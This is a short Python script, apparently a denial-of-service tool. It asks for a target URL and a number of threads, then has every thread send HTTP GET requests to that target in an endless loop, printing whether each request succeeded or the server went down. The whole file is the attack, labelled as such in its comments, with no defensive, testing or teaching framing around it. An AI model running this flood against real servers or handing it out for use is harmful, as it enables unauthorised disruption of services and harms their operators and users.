import threading
import requests

# Get input from the user
url = input("Enter target URL (e.g. http://127.0.0.1:5000): ")
threads = int(input("Enter number of threads: "))

def attack():
    while True:
        try:
            requests.get(url)
            print("Request sent to", url)
        except:
            print("Request failed or server down")

# Start attack threads
for i in range(threads):
    t = threading.Thread(target=attack)
    t.start()
